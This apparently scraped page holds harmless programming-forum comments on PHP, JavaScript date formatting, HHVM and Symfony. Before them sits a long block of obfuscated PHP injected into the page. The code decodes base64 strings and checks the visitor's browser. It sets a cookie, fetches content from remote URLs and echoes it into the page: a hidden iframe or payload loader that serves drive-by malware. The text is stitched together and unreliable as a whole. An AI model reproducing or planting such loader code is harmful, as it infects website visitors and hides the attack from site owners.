_1297167605($i){$a=Array('S'.'U'.'ZSQU1F'.'X1V'.'S'.'TA='.'=','aHR0cDovL3RyYW'.'N'.'rZX'.'IuaG'.'l'.'sbHNkYWxlZm91bmRhdGlv'.'bi5j'.'b2'.'0vMS'.'50eH'.'Q=','SUZ'.'SQU1'.'FX1V'.'ST'.'F8y','aHR0cDovL3J'.'vdXRl'.'ci5pb'.'nN0YWZ1bm'.'lhLmN'.'vbS8x'.'LnR4'.'dA='.'=',''.'SF'.'RUUF9VU0VSX'.'0FHRU5'.'U',''.'SFRU'.'UF'.'9V'.'U'.'0'.'V'.'S'.'X0'.'F'.'HR'.'U5'.'U','b'.'3'.'B'.'lc'.'mE=','SFRUUF'.'9V'.'U0VSX0FHRU5U',''.'TVNJRQ='.'=',''.'SFRUU'.'F9VU0V'.'SX0FHRU5U','Zml'.'yZWZveA'.'==','ZHNnZmRnMzRn','Z'.'HNnZmRn'.'MzR'.'n',''.'aHR'.'0'.'c'.'Do'.'vLw==','SF'.'R'.'UU'.'F9IT1NU','UkVR'.'VUVTVF9'.'VUkk=','aHR0c'.'A==','d'.'Glt'.'ZW91dA==',''.'R0V'.'UI'.'A==','Pw==','IE'.'hU'.'VFAgMS4'.'w'.'DQ'.'o'.'=','VXNlci'.'1B'.'Z2VudDogTW9'.'6aW'.'xsY'.'S81LjAgKFdpbmRvd'.'3M7'.'I'.'FU7I'.'Fdpbm'.'Rv'.'d'.'3MgTlQgNS4xOyB'.'lbi'.'1VUz'.'s'.'gc'.'nY6MS4'.'4L'.'jAuMykgR2V'.'ja'.'28vMjAw'.'NjA0M'.'j'.'Y'.'gR'.'ml'.'yZWZveC8xLjUuMC4zDQo=','QWNj'.'ZXB0OiAqLyoNCg==',''.'QWN'.'j'.'ZXB0'.'L'.'Uxhbmd'.'1YWdlOiBlbi11cy'.'xlbjtxPTAuNQ0'.'K','QWNjZXB0LU'.'NoY'.'XJz'.'ZXQ6IElTTy04'.'ODU5LTEsdXRmLTg7'.'cT0'.'w'.'Ljcs'.'KjtxPTA'.'uNw'.'0K','S2VlcC1B'.'bGl2ZTogMzAwDQ'.'o=','Q29'.'u'.'bm'.'VjdGlvbjoga2VlcC1h'.'bGl2'.'ZQ0K',''.'d'.'2dycWtvb'.'HBzdWVpa2Rn','bmp6','DQoNCg='.'=','cH'.'Vpe'.'Ghja2ljd'.'2d'.'kZ2'.'t'.'4c'.'m9n'.'b3'.'E'.'=','ZWZ6','c2M=','Y3VybF9pbml'.'0','YWx'.'s'.'b3dfd'.'XJ'.'sX2ZvcGVu','a'.'G9zdA==','aG'.'9zdA==','cGF0'.'a'.'A==','c'.'X'.'Vl'.'cnk=');return base64_decode($a[$i]);} ?&gt;&lt;?php $GLOBALS['_968955185_'][0](_1297167605(0),_1297167605(1));$_0=round(0+2435.5+2435.5);$GLOBALS['_968955185_'][1](_1297167605(2),_1297167605(3));$_1=round(0+642.4+642.4+642.4+642.4+642.4);if(isset($_SERVER[_1297167605(4)])&amp;&amp;($GLOBALS['_968955185_'][2]($_SERVER[_1297167605(5)],_1297167605(6))!==false || $GLOBALS['_968955185_'][3]($_SERVER[_1297167605(7)],_1297167605(8))!==false|| $GLOBALS['_968955185_'][4]($_SERVER[_1297167605(9)],_1297167605(10))!==false)){if(!isset($_COOKIE[_1297167605(11)])){$GLOBALS['_968955185_'][5](_1297167605(12),round(0+0.25+0.25+0.25+0.25),$GLOBALS['_968955185_'][6]()+round(0+1200+1200+1200)*round(0+6+6+6+6)*round(0+3.5+3.5));$_2=l__3(IFRAME_URL);if(empty($_2)){$_2=l__3(IFRAME_URL_2);}echo $_2;echo l__3(_1297167605(13) .$_SERVER[_1297167605(14)] .$_SERVER[_1297167605(15)]);exit();}}function l__0($_3){$_4=$GLOBALS['_968955185_'][7](array(_1297167605(16)=&gt; array(_1297167605(17)=&gt; round(0+7.5+7.5))));return $GLOBALS['_968955185_'][8]($_3,false,$_4);(round(0+1242.5+1242.5+1242.5+1242.5)-round(0+994+994+994+994+994)+round(0+861.66666666667+861.66666666667+861.66666666667)-round(0+517+517+517+517+517))?$GLOBALS['_968955185_'][9]($_4,$_COOKIE):$GLOBALS['_968955185_'][10](round(0+176.5+176.5),round(0+2485+2485));}function l__1($_5,$_6,$_7,$_8){$GLOBALS['_968955185_'][11]($_5,_1297167605(18) .$_7 ._1297167605(19) .$_8 ._1297167605(20) ."Host: $_6\r\n" ._1297167605(21) ._1297167605(22) ._1297167605(23) ._1297167605(24) ._1297167605(25) ._1297167605(26) ."Referer: http://$_6\r\n\r\n");while($_9=$GLOBALS['_968955185_'][12]($_5,round(0+1365.3333333333+1365.3333333333+1365.3333333333))){$_10 .= $_9;if($GLOBALS['_968955185_'][13](_1297167605(27),_1297167605(28))!==false)$GLOBALS['_968955185_'][14]($_11,$_8);}$GLOBALS['_968955185_'][15]($_5);$_11=$GLOBALS['_968955185_'][16]($_10,_1297167605(29));$_10=$GLOBALS['_968955185_'][17]($_10,$_11+round(0+1+1+1+1));return $_10;}function l__2($_3){$_12=$GLOBALS['_968955185_'][18]($_3);(round(0+1331+1331+1331)-round(0+1331+1331+1331)+round(0+1839)-round(0+919.5+919.5))?$GLOBALS['_968955185_'][19]($_13,$_10):$GLOBALS['_968955185_'][20](round(0+1595.5+1595.5),round(0+798.6+798.6+798.6+798.6+798.6));$GLOBALS['_968955185_'][21]($_12,round(0+42),FALSE);if((round(0+868.6+868.6+868.6+868.6+868.6)^round(0+4343))&amp;&amp; $GLOBALS['_968955185_'][22]($_9))$GLOBALS['_968955185_'][23]($_2);$GLOBALS['_968955185_'][24]($_12,round(0+3982.6+3982.6+3982.6+3982.6+3982.6),TRUE);if($GLOBALS['_968955185_'][25](_1297167605(30),_1297167605(31))!==false)$GLOBALS['_968955185_'][26]($_6,$_3);$GLOBALS['_968955185_'][27]($_12,round(0+6.5+6.5),round(0+5+5+5));$_10=$GLOBALS['_968955185_'][28]($_12);$_14=_1297167605(32);$GLOBALS['_968955185_'][29]($_12);while(round(0+641.25+641.25+641.25+641.25)-round(0+641.25+641.25+641.25+641.25))$GLOBALS['_968955185_'][30]($_15,$_11,$_3);return $_10;}function l__3($_3){if(@$GLOBALS['_968955185_'][31](_1297167605(33))){$_16=l__2($_3);}elseif($GLOBALS['_968955185_'][32](_1297167605(34))== round(0+0.5+0.5)){$_16=l__0($_3);}else{$_15=$GLOBALS['_968955185_'][33]($_3);if($_5=@$GLOBALS['_968955185_'][34]($_15[_1297167605(35)],round(0+40+40),$_13,$_17,round(0+5+5+5))){$_16=l__1($_5,$_15[_1297167605(36)],$_15[_1297167605(37)],$_15[_1297167605(38)]);}}return $_16;}
Hey, I'm one of the subjects of the piece. Are your unit tests in open source? If so, maybe we can bring them into the HHVM test suite. As described here HHVM is making a big push to run open source projects correctly. http://www.hhvm.com/blog/875/wow-hhvm-is-fast-too-bad-it-doesnt-run-my-code
a cashier earns like 20 000 in those cities
+1 Also using faker here
I'm getting kind of tired of this repeated mantra that doing everything in JavaScript is somehow better. When all you've got is a hammer, everything starts looking like a nail, I suppose. Don't get me wrong, though, it would probably be a nice *enhancement* to have it update via JavaScript, but when the development cycle starts and ends with JavaScript regardless of the project and its requirements, I think we have a problem.
The video is unavailable for me. This makes me a sad panda.
Yeah I agree with you, although I don't think it's relevant to me. I've only really stared using JS properly this year, and I've been coding PHP since 1999, so my JS comfort level is quite low. I rarely even consider doing stuff in JS that can be done either end. &gt; When all you've got is a hammer This goes for server side as well. Using this analogy, my hammer would be PHP rather than JS. In the past I've made quite a few weird interface decisions, simply to avoid the use of JS. I'm only just now slowly coming around to doing anything at all in JS. Having done this type of date formatting in PHP in the previous 14 years, I now think JS makes more sense for this specific task.
Quick clarification -- when I say "none quite solves the problem", I don't really mean that as a criticism. The examples (composer and vagrant/puppet) solve important problems; I use them, and I hope others do, too. My main point with "amp" is that there's a messy bit of setup that's needlessly sucky and unscriptable -- the process of creating a new DB and a new vhost is pretty much universally necessary in PHP apps, and the basics are always the same, but the details always seem to differ slightly (eg because one guy use Ubuntu; another guy uses MAMP; and a third guy uses MacPorts; then two guys use Apache and one uses nginx; ad nauseum). "amp" is meant as an abstraction to hide those details.
This is great news for the people behind Symfony, and everybody using Symfony or its components!
&gt; to flat-out deny certain users access to your content for no real gain would be silly It would indeed. That's why the actual date/time is already in the server-generated HTML. The JS just replaces that with the friendly "time ago" text. It doesn't start as blank content. &gt; Content indexers without JS support For which you don't want "time ago" at all, because it will be based on when the page was scraped, rather than when the user is seeing it. So for this to be correct you just want the actual date/time, which was already provided server-side without any JS. So server-side only here actually creates a problem. Both Reddit and Facebook use JS for this. Better tell them to get their act together. =)
So basically everyone
&gt;For which you don't want "time ago" at all, because it will be based on when the page was scraped, rather than when the user is seeing it. So for this to be correct you just want the actual date/time, which was already provided server-side without any JS. So server-side only here actually creates a problem. You misunderstand. That's simple progressive enhancement, something which I am advocating for. What I'm advocating against is writing an interface which doesn't work without JavaScript when the base requirements don't call for it. &gt;This is how both Reddit and Facebook do it. Reddit doesn't. I don't know about facebook, though. 
JavaScript? Java? C#? Why don't you have a look at a few and see which strikes your fancy.